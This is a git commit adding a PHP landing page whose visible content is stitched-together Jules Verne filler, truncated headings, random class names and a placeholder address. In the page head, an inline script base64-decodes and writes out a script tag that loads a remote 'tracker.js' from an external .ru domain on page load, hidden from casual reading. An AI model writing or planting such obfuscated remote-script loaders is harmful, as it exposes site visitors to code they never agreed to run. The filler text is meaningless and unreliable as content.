a97c679f07c0f094268d246e8cd6748bf0a1d3df
tispdpre <77451449+tispdpre@users.noreply.github.com>
2021-01-14 17:29:28 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The thing itself on the port quarter! cried the harpooner.</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl82c2Y1OWZhYWoyNDRhODU3NjUiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="iytcx96ybkxom14">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="b5xnlwne1ulp563">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The thing itself on the port quarter! cried the harpooner.</h1>
+	</section>
+
+
+	<section class="our-work" class="3yc8usa63al89ih">
+		<h3 class="title">I admit, captain, that I am not yet very familiar w</h3>
+		<p>Ned Land could not restrain his joy. He was like a prisoner that had escaped from prison, and knew not that it was necessary to re-enter it. It was indeed necessary to beat a retreat, for about twenty natives, armed with bows and slings, appeared on the skirts of a copse that masked the horizon to the right, hardly a hundred steps from us. My eyes turned involuntarily toward the glass, but I could not stand the fire which seemed to devour them. I understood what had happened. The Nautilus had put on full speed. All the quiet luster of the ice-walls was at once changed into flashes of lightning. The fire from these myriads of diamonds was blinding. It required some time to calm our troubled looks. At last the hands were taken down. Captain Nemo's companion took the beast, threw it over his shoulder, and we continued our journey. For one hour a plain of sand lay stretched before us. Sometimes it rose to within two yards and some inches of the surface of the water. I then saw our image clearly reflected, drawn inversely, and above us appeared an identical group reflecting our movements and our actions; in a word, like us in every point, except that they walked with their heads downward and their feet in the air.</p>
+		<hr>
+
+		<ul class="grid" class="03tbe7llclcyg8at6ct">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="iytcx96ybkxom14">
+		<h3 class="title">By its rigging, and the height of its lowe</h3>
+		<p>Is that you, professor? We gasped for breath. Stupefaction more than fear made us dumb and motionless. The animal gained on us, sporting with the waves. It made the round of the frigate, which was then making fourteen knots, and enveloped it with its electric rings like luminous dust. Then it moved away two or three miles, leaving a phosphorescent track, like those volumes of steam that the express trains leave behind. All at once from the dark line of the horizon whither it retired to gain its momentum, the monster rushed suddenly toward the Abraham Lincoln with alarming rapidity, stopped suddenly about twenty feet from the hull, and died out-not diving under the water, for its brilliancy did not abate-but suddenly, and as if the source of this brilliant emanation was exhausted. Then it reappeared on the other side of the vessel, as if it had turned and slid under the hull. Any moment a collision might have occurred which would have been fatal to us. However, I was astonished at the maneuvers of the frigate. She fled and did not attack. Never mind, said Ned Land urgently. On the 28th of February, when at noon the Nautilus came to the surface of the sea, in 9 4' north latitude, there was land in sight about eight miles to westward. The first thing I noticed was a range of mountains about two thousand feet high, the shapes of which were most capricious. On taking the bearings, I knew that we were nearing the island of Ceylon, the pearl which hangs from the lobe of the Indian Peninsula.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="b5xnlwne1ulp563" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="03tbe7llclcyg8at6ct" class="title">Certainly, I was sure of this devoted boy. As a rule, I never a</h3>	
+		<p>Several leagues! exclaimed Conseil. Unfortunately, said Ned Land, they have only given us the ship's fare. Sir, I am going to sink it. Because Captain Nemo cannot hide from himself that we have not given up all hope of regaining our liberty, and he will be on his guard, above all, in the seas, and in the sight of European coasts.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="iytcx96ybkxom14">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="b5xnlwne1ulp563"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="3yc8usa63al89ih"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="03tbe7llclcyg8at6ct"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>9324 Connelly Tunnel, Apt. 077, 00994, New Aracely, Montana, United States</p>
+	</footer>
+
+</body>
+
+</html>
